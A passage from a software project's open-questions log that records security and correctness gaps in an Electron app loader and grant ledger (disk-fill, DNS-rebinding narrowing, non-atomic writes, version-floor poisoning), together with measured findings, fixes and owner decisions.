   root (`node-storage.ts`'s `appRoot`/`codeRoot`), each with its own fresh 64 MiB budget.
   Nothing sums usage across origins or caps how many origins may be pinned at once.
2. **Across successive updates to the SAME origin.** The `silent`/TOFU install path
   (`install()` in `src/loader/index.ts`) never deletes assets left behind by a previous pin
   before writing the new one — `LoaderStorage` (`storage.ts`) declares only
   `readPin`/`writePin`/`writeAsset`, no delete/list/gc method at all. A hash-changing update
   accumulates the old bundle's bytes on top of the new one, indefinitely.

**Checked and ruled out as already covering this:** the `fs` capability's `quotaBytes`
(`src/broker/grants/grant-ledger.ts`) is a completely separate, unrelated budget — it governs what an
app writes through its own granted `orivon.fs` capability. Confirmed no shared accounting and
no shared root with the loader's code-cache storage; it cannot be read as already bounding this.

**Urgency:** flagged as urgent to resolve before/alongside PR #63, which makes bundle
fetch+cache automatic on just seeing an HTML `<link rel="orivon-manifest">` hint — once that
discovery trigger exists with no install-time consent gate, this becomes a pure-browsing
disk-fill vector: visiting enough hostile or merely careless pages, each not deleted or capped
in aggregate, fills the disk with zero explicit consent.

**Not proposed here:** a specific quota or eviction design (retention window, per-origin vs.
global cap, eviction order). That is a policy decision for an ADR, not something to guess into
this entry.

**Needed by:** before/alongside PR #63 lands. See above.

**Gap 1 (across different origins) resolved 2026-09-04, owner decision.** No aggregate,
cross-origin disk cap is enforced. `MAX_BUNDLE_BYTES` (64 MiB) per origin remains the only bound
— total disk use across every pinned origin is unbounded, deliberately. This mirrors how
mainstream browsers already behave: no user-facing "total cache size" ceiling, only per-origin
storage quotas, with the OS/browser's own storage-pressure eviction as the real backstop under
genuine disk exhaustion (out of scope for Orivon's MVP to build its own version of). Asked as a
direct question, not guessed: the owner considered and explicitly rejected a global ceiling
(512 MiB / 1 GiB / 256 MiB were offered as concrete options) in favour of no ceiling at all. This
closes the specific "wiring the trigger would ship an unbounded ... disk-fill vector" concern
`ADR-0012` raised for THIS gap — the disk-fill is still technically unbounded, but that is now a
considered design choice rather than an unexamined gap.

**Gap 2 (across successive updates to one origin) still needs fixing, independent of the above**
— it is not a quota question, it is plain hygiene: an update should not leave the previous
version's now-unreferenced files sitting on disk forever regardless of any ceiling. Tracked for a
follow-up fix in the same stream as this resolution.

**Gap 2 correction, 2026-09-04 (fix-67, `stream/loader-07-prune-superseded-assets`):** the
"tracked for a follow-up fix" note above is superseded — the follow-up landed in the same PR
this entry already named, not a later one. `pruneAssets` as originally merged had two real
defects that made "gap 2 is fixed" premature: a Unicode-normalisation mismatch (NFC vs. NFD)
between its keep set (`resolveAssetPath`, manifest-derived) and its on-disk walk (`readdir`-
derived) could delete a live, still-declared asset on HFS+/APFS — a supported run-from-source
target, not a hypothetical — and an unguarded `rm()` let a single undeletable file (a race, a
permission error) abort the whole prune, which aborts `install()` before `writePin` runs,
leaving a fully-written bundle with no pin record (the next `load()` would then read it back as
fresh TOFU with no reconsent check — worse than the disk-hygiene gap this was fixing). Both are
fixed: paths are NFC-folded on both sides before comparison, and the delete loop is `{ force:
true }` plus a per-file try/catch that logs and continues rather than throwing. A directory left
empty by pruning is now removed too. Gap 2 is resolved.

---

### A59 — whether `net.fetch`'s `Response.url` can be wrong on an ordinary, non-redirected fetch is unresearched **[RESOLVED 2026-09-13 — measured, then fixed via A141]**

Found 2026-09-03, a review-pass follow-up to `electron-fetch.ts`'s `redirect: 'error'` fix.

`node_modules/electron/electron.d.ts` documents the `.type` and `.url` values of `net.fetch`'s
returned `Response` as incorrect — as an UNCONDITIONAL bullet under `net.fetch`'s own
"Limitations", not one scoped to redirected responses. `fetch-bundle.ts`'s same-origin and
canonical-path checks (`fetchBundle`'s manifest and asset-loop checks alike) read
`response.url` as their SOLE source of truth for where fetched bytes actually came from, on
EVERY fetch — not only a would-be-redirected one.

**What is closed.** The redirect-specific attack — a malicious redirect landing `fetchBundle`
on a different origin while `.url` still reads as the requested one — cannot happen:
`redirect: 'error'` causes Electron's own `net-client-request.ts` to hard-reject the promise the
instant a redirect response is seen, so a followed `Response` with a `.url` to distrust never
exists in the first place. That mechanism does not depend on `.url`'s accuracy at all.

**What is not closed, and not researched.** Whether `.url` can be wrong on an ORDINARY,
non-redirected, 200-OK fetch — and if so, in what way (stale, re-derived from the request rather
than the response, mangled for some URL shapes, or something else) — is not stated by Electron's
docs and was not resolved by a context7 query against live Electron documentation either; both
are silent past the one-line "incorrect" warning. If `.url` on a successful, non-redirected
`net.fetch` can name a different origin or path than where the bytes actually came from,
`fetch-bundle.ts`'s origin and canonical-path checks would be trusting exactly the field that is
wrong, on every single fetch they perform — not a narrow gap.

**AI recommendation:** before the loader's discovery trigger (PR #63's `<link
rel="orivon-manifest">` hint, or any other path that reaches `fetchBundle` from live, un-curated
content) is wired to something a real user's browsing can reach, someone should empirically test
`net.fetch`'s actual `Response.url` value against a real HTTPS server in a real Electron process
— varying scheme, port, path, query string and trailing slash — since neither Electron's docs
nor available tooling explain the concrete failure mode well enough to reason about it from
first principles.

**Needed by:** before the loader's discovery trigger is wired to anything live. See
`electron-fetch.ts`'s `redirect: 'error'` comment, which cites this entry.

**Measured 2026-09-13 (lane S4-A59-probe, `spike/a59-response-url/`, throwaway, Electron 44.0.0,
Chrome 152.0.7977.54; real launch confirmed via `app.getVersion()`/`MessageChannelMain`).** The
answer is not "sometimes wrong" — `net.fetch`'s `Response.url` was the **empty string on every
single ordinary, non-redirected, 200 OK response observed, with no exception found.** Measured
against two real local servers (`node:http`, and `node:https` with a throwaway, freshly-generated
self-signed cert, trusted narrowly by its exact SPKI hash via Chromium's own
`--ignore-certificate-errors-spki-list` rather than by disabling certificate verification
outright), called from a real Electron main process with
`electron-fetch.ts`'s own options (`credentials: 'omit', redirect: 'error'`), across 20 distinct
request shapes: plain path, trailing slash, no trailing slash, a query string, a percent-encoded
path segment (`/a%2Fb/c%20d`), a duplicate slash (`/a//b//c`), a fragment (correctly stripped
before the network request — standard Fetch-spec behaviour, not an Electron quirk), combined
query+fragment, a non-ASCII query value, an uppercase host (`LOCALHOST`), an IDN host given both
as punycode (`xn--caf-dma.localhost`) and as the raw Unicode label, and an IPv6 literal (`[::1]`)
— each repeated over both `http:` and `https:`. All 20 came back `status: 200`,
`redirected: false`, `type: 'default'`, `ok: true`, `url: ''`. A 21st case (embedded userinfo,
`http://user:pass@host/...`) never produced a `Response` at all — `net.fetch` throws
`TypeError: Request cannot be constructed from a URL that includes credentials`, standard
Fetch-spec behaviour, unrelated to this entry. Confirmed this is not an artefact of the probe's
own harness with a second, minimal, options-free isolation script
(`spike/a59-response-url/isolate.cjs`): a bare `net.fetch(url)`, no request-init object at all,
against a fresh `node:http` server, still returned `url: ''`. `response.type` is also confirmed
wrong exactly as `electron.d.ts` warns — always `'default'`, never `'basic'`.

**What this means for `fetch-bundle.ts`.** `originFromUrl('')` is `null` (`new URL('')` throws
with no base — confirmed), so `manifestOrigin !== canonicalOrigin` (`null !== canonicalOrigin`)
is true on every call, and `fetchBundle` rejects **every** manifest fetch with "manifest was
served from a different origin (invalid) than requested" — before ever reaching the asset loop,
which has the identical shape and would reject the same way. This is fail-closed, not a security
hole: nothing is tricked into passing the check. But it means `fetchBundle` cannot succeed
against a real `net.fetch` call as currently written, at all, regardless of which origin is being
fetched — a correctness defect, not a narrow edge case. **Filed as A141, not fixed here**
(`fetch-bundle.ts`/`electron-fetch.ts` are another lane's paths; the fix needs its own branch and
review).

**Residual, not measured:** a real (CA-signed) HTTPS certificate chain — the SPKI allowlist
above bypasses every certificate error (including a hostname/SAN mismatch) for the one exact
generated key, so hostname-vs-certificate mismatch behaviour was not exercised, though nothing
else was trusted by it; a true default port (`:80`/`:443`
— this environment's `ip_unprivileged_port_start=1024` refused the bind with `EACCES`, confirmed,
so the port axis was tested only at non-default, dynamically-assigned ports); a non-loopback
host; a proxied connection; non-GET methods; any Electron version other than 44.0.0.

**This half of A59 can close on this evidence** — "can `.url` be wrong on an ordinary fetch" is
now answered directly, by measurement, rather than left to reasoning from a one-line doc warning.
**PR #164 is not unblocked by this measurement** — it is blocked on the newly-filed A141 instead,
which is worse than what this entry originally worried about (a silently wrong origin) and
simpler to act on (the field is unusable outright, not subtly misleading).

> **Closed 2026-09-13, lane S4-A141-fetch-url.** A141 (below) is fixed:
> `fetch-bundle.ts` no longer reads `response.url` at all, so this question is moot rather than
> merely answered. See A141's own resolution block for what changed and how it was verified.

---

### A60 — `GrantLedger.registerApp` unconditionally raises `versionFloor`; calling it on every FETCHED manifest, not only an ACCEPTED install, is a self-inflicted-DoS risk **[STILL OPEN]**

Found 2026-09-03, a review-pass follow-up; no current caller exists yet to exhibit the bug.

`registerApp` (`src/broker/grants/grant-ledger.ts`) raises `versionFloor` to `manifest.version`
unconditionally on every call, and its own doc comment states "T19's replay guard depends on
every registration going through here." Nothing outside `src/broker/` calls it yet —
`grep -rn "registerApp" src/loader/` returns nothing — so this is not a live bug, only a shape
that would become one depending on how the loader-to-broker wiring is eventually written.

**The risk.** If a future caller invokes `registerApp` for every manifest `fetchBundle`
FETCHES — which is what the doc comment's "every registration" language implies — rather than
only for a manifest whose `decideUpdate()` verdict is actually accepted (TOFU or `silent`), a
hostile origin can serve a manifest declaring an absurdly high fake `version`, have it
registered and the floor permanently raised, even though the install itself is separately
rejected or forced into re-consent. That self-inflicts a denial-of-service against every future
LEGITIMATE (numerically lower) version ever served from that origin afterward — T19's own replay
guard, aimed at protecting the user from a rollback, would instead be locking the user out of
every real update.

**Compounds with A57.** `GrantLedger` has no persistence (A57): there is no undo path for a
floor raised this way short of a full process restart, which resets ALL floors, not just the
poisoned one — so the workaround for this bug is strictly worse than living with it.

> **Correction, 2026-09-04 (fix-68, PR #68):** the paragraph above is now stale on both counts.
> A57 is resolved — the floor is persisted and a restart no longer resets it, so "wait for a
> restart" was never a real workaround to begin with going forward. See the amendment below for
> the escape hatch this PR builds instead.

**AI recommendation:** whoever wires the loader to the broker should call `registerApp` only at
the point an install is actually being accepted (the TOFU or `silent` branch of
`decideUpdate()`), never merely on a successful fetch/parse. Not fixed here: no such call site
exists yet to fix — this is a design constraint for the wiring PR, not a bug in
`grant-ledger.ts`'s current code.

**Needed by:** before the loader ever calls `registerApp`.

**Update 2026-09-04 (fix-68, PR #68):** `GrantLedger.forgetOrigin` now exists as the escape
hatch this entry's "AI recommendation" implicitly needed — it clears both the in-memory record
and the persisted floor (`LedgerStorage.deleteVersionFloor`), so a poisoned floor is no longer
permanent even though A57 removed the reset-on-restart this entry's own text relied on as the
(bad) workaround. Nothing calls it yet: there is still no "remove this app" UI action, or any
other call site, that decides WHEN to invoke it. That decision — and the loader-to-broker wiring
this entry's main recommendation is about (call `registerApp` only on an accepted install, never
a bare fetch) — remain open.

**Amended again 2026-09-04 (fix-68 round 2, PR #68):** `forgetOrigin`'s doc comment previously
called the primitive "provably correct ahead of that wiring". It is correct and complete for the
version floor, which is what this entry needs, but it is not an "uninstall this app" primitive
and must not be wired up as one. It also clears the origin's `manifest`, `grants` and
`fsBytesWritten`, and two of those it does not finish: dropping a grant does not revoke the
handles that grant authorised (`GrantLedger` holds no reference to `HandleTable` — that cascade
belongs in `createBroker`, alongside the one `revoke` already performs), and resetting
`fsBytesWritten` to zero frees no bytes on disk, so a forget-then-re-register sequence is a way
around the `fs` quota until the confinement directory is actually sized (A29). Neither is
reachable today because nothing calls the method; both become live the moment the "remove this
app" action this entry describes is built. Whoever builds it owns the cascade, not `GrantLedger`.
The doc comment now states this rather than overclaiming.

---

### A61 — `patternSetFromGrants` is fully unwired; `LoadContext.grantedPatterns` has no real caller building it from the grant ledger **[STILL OPEN]**

Found 2026-09-03, a review-pass follow-up.

`patternSetFromGrants` (`src/broker/policy/update.ts`) exists to turn what the grant ledger
actually holds (`GrantLedger.grantsFor`) into the `PatternSet` shape `decideUpdate()` compares
against — `grep -rn "patternSetFromGrants" src/` shows it is called only from its own test file
(`update.test.ts`). `src/loader/index.ts`'s `LoadContext.grantedPatterns` — the field
`load()`'s own header comment (CRITERION 4) insists must be "what the grant ledger actually
holds... NEVER `manifest.capabilities`" — is still an externally-supplied parameter with no real
caller anywhere in `src/` that builds it via
`patternSetFromGrants(await broker.app.grants(origin))` or any equivalent. Confirmed:
`grep -rn "grantedPatterns" src/` finds only `update.ts`'s own field definition, `index.ts`'s
`LoadContext.grantedPatterns` declaration and its one pass-through into `decideUpdate()`, a
comment in `update-patterns.ts` explicitly disclaiming it ("this file produces `newPatterns`,
never `grantedPatterns`" — a different, unrelated mapping from manifest capabilities to
patterns, not from grants to patterns), and test-only construction in `update.test.ts` and
`index.test.ts`. No production code path builds the value.

**Why this is worth filing plainly, unlike leaving it implicit.** `versionFloorFor`
(`src/broker/index.ts`) is in the identical position — defined, exposed as "the app loader's
seam," not yet called from `src/loader/` — and that non-wiring status is already stated
outright in A57's own text. This entry does the same for `patternSetFromGrants` /
`grantedPatterns`, matching this codebase's established discipline of filing a plumbing gap
before it is discovered by someone assuming it already exists. Without this entry, a maintainer
grepping for "how do I get granted patterns for the loader" would reasonably conclude the
loader-to-broker wiring already exists end-to-end, when in fact `LoadContext` is still an
injected stub with no production caller.

**Not yet a live risk**, for the same reason A57 and A60 are not: nothing outside tests calls
`Loader.load()` at all yet (`grep -rn "\.load(" src/` outside `src/loader/tests/index.test.ts` finds
no caller either), so there is no live path where `grantedPatterns` could currently be supplied
wrong.

**AI recommendation:** none beyond visibility — whoever wires the loader to the broker should
build `LoadContext.grantedPatterns` via `patternSetFromGrants(broker.app.grants(origin))` (or
whatever the real `Broker`-facing accessor turns out to be named), not invent a second mapping.

**Needed by:** before `Loader.load()` is ever called from real code.

---

### A62 — `nodeLoaderStorage`'s writes are not atomic, and nothing serializes concurrent `load()` calls for the same origin **[STILL OPEN]**

Found 2026-09-03, a review-pass follow-up.

`nodeLoaderStorage` (`src/loader/node-storage.ts`) writes both the pinned asset bytes
(`writeAsset`) and the pin record (`writePin`) via a direct `writeFile` call each — no
temp-file-then-rename, no `fsync`, nothing that makes either write atomic. `Loader.load()`
(`src/loader/index.ts`) has no per-origin lock or serialization of any kind: nothing prevents
two concurrent `load()` calls for the same origin — two tabs hitting the same manifest hint at
close to the same time, for instance — from interleaving their `writeAsset`/`writePin` calls
into the same `code/` tree and the same `pin.json`.

**Distinct from A58.** A58 is about disk QUOTA — nothing bounding total bytes written across
origins or successive updates. This entry is about CONCURRENCY — two writers racing into the
same on-disk state — a different mechanism entirely; a system with an airtight quota would still
have this gap, and a system with unlimited disk would still have it too.

**The specific hazard.** `bundleTree()`'s hash (`tree.root`) is computed over the bytes
`fetchBundle` already holds in memory, entirely BEFORE `install()` writes anything to disk —
nothing re-verifies, after a write completes, that the bytes actually on disk still match the
hash that was pinned. Two racing `load()` calls for the same origin (same or different fetched
bundles, e.g. an update landing mid-way through a slow first install) can interleave their
`writeAsset` calls file-by-file and their `writePin` calls record-by-record, leaving `pin.json`
naming a `bundleHash` that the actual bytes under `code/` — a mix of both writers' output — no
longer add up to. A non-atomic single-file write can also leave a half-written file if the
process dies mid-write, independent of any race.

**Not yet a live risk**, same reasoning as A57/A60/A61: nothing outside `src/loader/tests/index.test.ts`
calls `Loader.load()` yet, so no real caller can currently trigger two concurrent installs for
one origin.

**AI recommendation:** none — whether the fix is a temp-file-then-rename write plus an fsync, a
per-origin async lock/queue in front of `load()`, a post-write hash re-verification, or some
combination, is a design decision for whoever wires `Loader.load()` into something with real
concurrent callers (multiple windows/tabs), not something to guess into this entry.

**Needed by:** before `Loader.load()` is reachable from more than one caller at a time.

**Amendment, 2026-09-04 (fix-67):** `pruneAssets` (merged the same day as this entry, in the PR
this entry already anticipates — see A58 gap 2) adds a THIRD kind of interleaving into this
exact window, distinct from the two writers described above: a DELETING mutation racing a
writer, not just two writers racing each other. It appears at two levels.

At the FILE level, two concurrent `load()` calls for the same origin can interleave one call's
`writeAsset`s with the OTHER call's `pruneAssets` keep-set walk — a file the second call is about
to write can be walked, found absent from the first call's (older) keep list, and deleted out
from under a write still in flight, or a file the first call already wrote can be deleted by a
second call's prune before the first call's own `writePin` ever runs. `pruneAssets` tolerates a
file disappearing out from under it mid-prune (`{ force: true }`, ENOENT treated as success) and
never aborts `install()` over one undeletable file or one unlistable subtree. That hardening
makes the race non-fatal (no uncaught throw, no aborted `install()`), not correct: the deletion
can still happen.

At the DIRECTORY level, pruning is the FIRST thing in the loader that removes a directory at
all. Before it, the write path (`mkdir` then `writeFile`) could not lose its parent directory
mid-write, because nothing removed one. A prune that swept every empty directory under the code
root would reintroduce exactly that: one call's `mkdir` for a new subdirectory, not yet written
into, is indistinguishable from a leftover, and removing it makes the concurrent `writeFile` fail
with ENOENT — a hard failure that did not exist before pruning. `pruneAssets` therefore removes a
directory only if this prune itself deleted a file from it (`removeEmptyAncestors`), and treats
ENOENT/ENOTEMPTY on that removal as the concurrency it is rather than an error. One residual
window remains and is deliberately not closed here: a directory that a prune legitimately empties
and removes can still be one a concurrent install is about to write into, between that install's
`mkdir` and its `writeFile`.

Neither level is closed by any of this. Both remain exactly the open question this entry already
names, and the fix for both is the per-origin serialization below.

---

### A63 — `nodeLedgerStorage.readVersionFloor` cannot tell a transient OS read error from real corruption, and one such error fails an origin closed for the whole session **[STILL OPEN]**

Found 2026-09-04 (fix-68 round 2, PR #68). Not fixed in that PR: the safe fix is a design change,
and the obvious quick fix is a T19 regression.

`readVersionFloor` (`src/broker/grants/node-ledger-storage.ts`) returns `CORRUPT_FLOOR_SENTINEL` for
every non-ENOENT read failure. That correctly covers genuine corruption (malformed JSON, wrong
shape) but also covers EACCES, EMFILE, EBUSY and every other plausibly-transient OS condition,
where the file on disk was never corrupt at all.

**Why one such error is permanent for the session.** `GrantLedger.#hydrateFloor` runs at most
once per record, on `#record`'s create branch. A transient failure at an origin's first touch
this session therefore sets `versionFloor` to the sentinel, and `isAtOrAboveFloor`
(`policy/update.ts`) fails closed on a value `compareVersions` cannot order — so every update
from that origin is rejected for the rest of the session, with no writer that lowers a floor back
out of that state. Failing closed is the right direction, but the user sees a working app refuse
every legitimate update because a file descriptor was briefly unavailable.

**Why the obvious fix is wrong.** Returning `undefined` for the OS-error case makes it
indistinguishable from "never persisted", which resets the floor to `'0.0.0'` and reopens exactly
the T19 rollback A57 closed. `LedgerStorage.readVersionFloor`'s own doc contract forbids it in as
many words.

**What a real fix needs**, all three together: (1) a third state in
`LedgerStorage.readVersionFloor`'s return — something like
`{ kind: 'absent' | 'value' | 'corrupt' | 'unavailable' }` — so the two failure classes are
distinguishable at the boundary rather than collapsed; (2) a way for `#hydrateFloor` to run again
on a later touch of the same record, which it cannot do today; (3) a rule for how a record leaves
the fail-closed state on a successful retry without violating `versionFloor`'s "raise only, never
lower" invariant — probably by never entering it in the `'unavailable'` case and instead marking
the record un-hydrated, so the raise-only rule is untouched. Note (2) has a cost worth pricing: a
retry-on-touch hydration reads disk on more paths than today's once-per-record does.

**AI recommendation:** do this alongside, or after, whatever work first gives `GrantLedger` a
real production caller. It is not worth designing a retry policy for a read path nothing outside
tests exercises yet.

**Needed by:** before the loader calls `versionFloorFor` on a real user's disk.

---

### A64 — `scripts/comment-budget-baseline.txt` lost `src/broker/policy/origin.ts` because an import moved, not because documentation shrank **[STILL OPEN]**

Found 2026-09-04 (fix-68 round 2, PR #68), reviewing PR #68's own round-1 diff.

Round 1 added `import { classifyAddress } from './address.js'` to `src/broker/policy/origin.ts`,
positioned after the file's 16-line header and before the large JSDoc on
`ORIGIN_BEARING_SCHEMES`. `check-comments.mjs`'s `measurePreamble` stops counting at the first
non-comment line, so the measured preamble fell from 46 lines to 16 and the file's baseline entry
became stale — the ratchet then REQUIRED its removal, since a stale entry fails the check. No
documentation was shortened.

**The honest reading, though, is not simply "the scanner was gamed."** The 46-line measurement
was itself an artefact of declaration order: it counted the header (16 lines) PLUS a doc comment
attached to a declaration, which is not the file-header essay Rule 1's guard exists to catch.
What the file measures now — 16 lines, and a budget of 25 before the guard fires — is precisely
the header, which is what the rule is about. So the file is arguably measured more correctly than
before, by accident.

**What is nonetheless true:** the guard's behaviour for any given file depends on where its first
import sits, so two files with identical headers can measure differently. That is a property of
the tool worth knowing about, and it was changed here by a side effect rather than a decision.

**Not fixed in PR #68**, on the reasoning above — moving the import below the JSDoc blocks it
serves would be unidiomatic TypeScript with no precedent in this tree, and the current position
is where an import belongs. **Owner's call:** whether `measurePreamble` should skip import lines
rather than stop at them (which would restore the 46-line measurement and put the baseline entry
back), or whether counting only up to the first code line of any kind is the intended, simpler
rule.

**Needed by:** nothing. Tooling accuracy only.

---

### A65 — no discovery-trigger path lets a developer install their own local Orivon app **[STILL OPEN]**

Found 2026-09-04, building the T12/A46 install-origin guard (`stream/loader-09-install-origin-
guard`) that made this concrete rather than hypothetical.

A46's own resolution permits installing a loopback origin, but **only** when the URL came from a
user action (typed into the address bar, or an explicit action on something the user typed) —
**never** from a page-supplied hint. Since the "Open as app" cut (`capability-api.md`'s
2026-09-03 correction), the passive `<link rel="orivon-manifest">` hint is the *only* discovery
trigger this loader is ever wired to. There is no second trigger left for A46's user-action
carve-out to attach to, so in practice loopback is never installable at all right now: a developer
building their own local Orivon app has no way to exercise the discovery trigger against
`http://localhost:PORT`.

**Asked directly, answered, not yet built.** The owner's direction (2026-09-04, same conversation
that raised this gap): a real permission mechanism, but **user-granted per address, before Orivon
ever contacts it** — explicitly not a manifest-declared flag, since reading a manifest requires
contacting the address first, which is the exact thing being guarded against. This is confirmed
design intent, not an open question about the mechanism's shape.

**Why not built now, an AI scope call rather than something the owner was asked to sequence:**
the mechanism needs a genuinely new kind of UI surface — nothing like a settings page or a
persisted, user-editable address allowlist exists anywhere in this shell today — and
`build-plan.md`'s own Sequence already reserves this territory for build step 9, "Developer mode
— unpacked loader, plainly-worded opt-in, unsigned marking, developer docs." Building a
first-of-its-kind settings surface as a side effect of the discovery-trigger work risked exactly
the scope creep `CLAUDE.md` Rule 4 warns about.

**Needed by:** before build step 9 ships, if a real developer workflow for testing a local app's
manifest hint is expected to exist by then. Not blocking anything in build step 2/4 — the
discovery trigger works correctly for every real, public origin without this.

---

### A66 — Electron's `net` module cannot pin a fetch's connection to a resolved literal (residual TOCTOU narrowing only, F2) **[RESEARCH — investigated, no fix available on this API surface]**

Found 2026-09-05, `stream/loader-09-install-origin-guard`, fixing the DNS-rebinding/TOCTOU hole
two independent review passes found in the T12/A46 install-origin guard (F2 in that lane's brief):
`ensurePublicUnicastOrigin` resolved, validated, and then discarded the addresses, so
`fetch-bundle.ts` named the install origin's host a SECOND time for every request — a fresh,
independent resolution free to disagree with the guard's.

`src/broker/policy/connect.ts`'s own discipline for the same problem, one layer down, is "resolve
once, validate every answer, and hand the caller the validated literals **to dial**" — the broker's
real `dialTcp` (`src/broker/adapters/node-adapters.ts`) then opens a raw `node:net` socket straight to one of
those literals, never naming the hostname again. **That exact mechanism does not exist for a
Chromium-mediated fetch.** Confirmed directly against `node_modules/electron/electron.d.ts`
(electron 44) and Electron's own docs, not assumed:

- `request.setHeader()` explicitly refuses to set `Host` (citing Chromium's own
  `header_util.cc`) — the standard "rewrite the URL to the IP literal, keep the real hostname via a
  `Host` header" pinning pattern is not available.
- `--host-resolver-rules` (the one way to force a hostname to resolve to a specific address) is a
  **command-line switch, set once before `app.whenReady()`** — not a per-request option, so it
  cannot pin one install's fetch without affecting every other request the whole process makes at
  the same time.
- Neither `net.fetch`'s `Response` nor `net.request`'s `ClientRequest`/`IncomingMessage` exposes
  the remote address a request actually connected to — there is no way to verify after the fact,
  either.
- Rewriting the fetch URL itself to the validated IP literal was considered and rejected: it breaks
  TLS/SNI-based certificate validation for every real `https:` host (the certificate is issued for
  the hostname, not the IP), and it breaks `fetch-bundle.ts`'s own same-origin check
  (`originFromUrl(response.url) === canonicalOrigin`), which can never hold once `response.url`'s
  host is an IP literal instead of the app's real hostname — trading a real, closed hole for a
  worse one (either every legitimate install starts failing, or that origin check gets loosened to
  accept IP literals, which is the actual security regression).

**What shipped instead, in this fix:** the install-origin guard's resolver was switched from
`node-adapters.ts`'s node:dns-based `resolveHost` (correct for the broker's own raw-socket
`tcp.connect`, wrong here) to `electron-resolve.ts`'s `electronResolveHost`, over Electron's
`net.resolveHost` — Chromium's own resolver, the same one `electron-fetch.ts`'s `net.fetch` call
actually consults (both run under the default session). This closes F2's root cause: the guard and
the real request are no longer answered by two independent resolvers/caches that can simply
disagree. `electron-fetch.ts` additionally re-runs `net.resolveHost` and re-validates
publicness immediately before every individual fetch (manifest and each asset), narrowing the
window `F5` named — an up-to-`BUNDLE_TIMEOUT_MS` (10 minute) asset loop — from "the guard's
resolution may be arbitrarily stale by the time this asset is fetched" to "this address was public
a moment before this specific request went out."

**What this does NOT reach:** connect.ts's own guarantee (dial the literal address that was
validated, so the hostname is never resolved again at all) is structurally unavailable to a fetch
that must go through Chromium's network stack rather than a raw socket this codebase controls.  A
sufficiently well-timed rebind — flipping between `electron-resolve.ts`'s check and `net.fetch`'s
own internal resolution a moment later, against the *same* resolver and cache — is not
impossible, only far narrower than the original bug (which had two entirely different resolvers,
and a window as wide as the whole install). This is a genuine platform limitation, not an
oversight left for later inside this lane.

**Leaning, not decided:** if this residual gap is judged unacceptable for the flagship's threat
model, the fix would need to replace `net.fetch` with a fetch implementation this codebase does
control the socket layer for (e.g. Node's own `fetch`/`undici`, wired through a custom `Agent`
whose `connect`/`lookup` can be pinned the way `dialTcp` already pins TCP) — at the cost of losing
`net.fetch`'s session-awareness and Chromium network-stack integration (proxy config, cookie
jars, etc.) that `electron-fetch.ts`'s own header names as the reason it exists. That trade was not
made here: it is a bigger architectural change than one guard fix, and belongs in front of the
owner, not decided inside this lane.

**Needed by:** before this loader is exposed to a threat model that assumes full DNS-rebind
closure rather than "closed at the resolver level, narrowed at the request level." Not blocking
build step 2/4 — every real, public origin installs correctly, and the practical bar (an attacker
who can win a race against Chromium's own resolver cache, immediately before a request it also
controls) is far higher than the original bug (two independent, disagreeing resolvers with a
multi-minute window).

---

### A67 — `widensAuthority` cannot see a capability being dropped entirely, so a rollback (or any update) can silently change a scalar quota **[STILL OPEN]**

Found 2026-09-05, `stream/loader-08-rollback-warning` (PR #72), reviewing that PR's own F1 fix.

`widensAuthority` (`src/broker/policy/update.ts`) iterates `Object.keys(requested)` -- the NEW
manifest's own declared capabilities -- and asks whether each requested pattern is covered by an
already-granted one. If the new manifest drops a capability kind entirely (e.g. no `fs` block at
all, where the previous manifest had one with an explicit `quotaBytes`), that kind is never
visited, so the check reads this as "nothing new requested," never as a change worth a prompt.

`fs.quotaBytes` defaults to unlimited when absent (`src/broker/grants/grant-ledger.ts`'s quota-reservation
path), read from whatever manifest is currently REGISTERED, not from a pattern the grant ledger
separately tracks. So a manifest that drops `fs` (or otherwise omits a scalar capability field)
can move actual, effective quota enforcement from a stated limit to unlimited, with
`widensAuthority` seeing no widening at all -- because there is no PATTERN to compare, only a
scalar field's absence.

**Not the silent-install bug F1 was.** `isSameBundle` (the other half of `ordinaryEscalation`,
`update.ts`) still fires here in every real case: the manifest itself is a hashed bundle leaf
(`ADR-0009`), so dropping a field moves the bundle hash, and the caller sees at minimum
`reconsent` -- "the code changed," never a silent install. What's missing is precision, not a
bypass: the user is asked to reconsent to what looks like an ordinary content update, with no
signal that a scalar resource limit is about to change underneath it.

**Not fixed in PR #72**, deliberately: `PatternSet` models capability KINDS as lists of string
patterns; it has no vocabulary for a scalar field like `quotaBytes` at all, and giving
`widensAuthority` an opinion about one specific scalar without a general shape for "capabilities
carry non-pattern fields too" would be exactly the kind of one-off carve-out `code-guidelines.md`
Rule 7 warns against. This needs either a `PatternSet` shape change (a real, reversible-only-at-
cost decision -- Rule 1) or a narrower, `fs`-specific check with its own justification, not a
quick patch inside this PR.

**Needed by:** nothing urgent -- no live caller reaches `registerApp` outside tests yet
(`docs/open-questions.md` A60/A61). Worth resolving before the loader-to-broker glue
(`installFromHint`, A60/A61's own eventual caller) is the thing that makes this reachable from a
real, page-supplied manifest.

---

### A68 — the T19 rollback acknowledgement is remembered per SPECIFIC VERSION, not per origin **[AI RECOMMENDATION — not yet directly confirmed by the owner]**

Found 2026-09-05, `stream/broker-22-rollback-ack-persistence`, building the storage PR #72's
rollback-warning design (`ADR-0013`) needs.

**Owner's decision (d-0017, this session):** when a user accepts a below-floor ("rollback")
version for an app, that choice is remembered — asked once, then the older version installs
with a permanent passive notice rather than a re-prompt every launch.

**AI recommendation, not put to the owner in this exact form:** what gets remembered is the
SPECIFIC version accepted, not a bare per-origin "this origin's rollbacks are trusted" flag. A
flag was the first design built for this lane, matching a literal reading of d-0017's one-line
summary; caught in review before it shipped: a flag would let accepting one real,
presumably-safe rollback (`1.2.0` → `1.1.9`) permanently wave through any OTHER, unrelated
below-floor version the same origin later chooses to serve — `0.0.1`, or anything else — with
no further consent. That is a capability escalation wearing a UX-shortcut's clothes, not what
d-0017 asked for. Storing the specific accepted version and comparing it exactly (never "any
prior acknowledgment counts") closes that gap. `src/broker/grants/grant-ledger.ts`'s
`rollbackAcknowledgedVersionFor`/`acknowledgeRollback`, `src/loader/index.ts`'s
`LoadContext.acknowledgedRollbackVersion`, and `docs/decisions/ADR-0013`'s own text should all
agree on this — recorded here because d-0017 itself was otherwise undocumented anywhere in
`docs/` or `docs/decisions/`, only in this session's own `state.json`.

**Needed by:** confirm before the discovery-trigger hint listener (the first real UI caller of
`acknowledgeRollback`) is built — that PR should not have to guess at this granularity or
re-derive the reasoning above.

### A80 — nothing bounds the aggregate per-origin socket-memory ceiling, despite a comment claiming it is tracked here **[RESOLVED 2026-09-06 — owner decision]**

Found 2026-09-06, `ca:security-reviewer` pass on `stream/contracts-12-write-pump-protocol`
(PR #79, the write-pump wire protocol).

`src/contracts/limits.ts`'s doc comment on `writeWindowBytes` says doubling the write window to
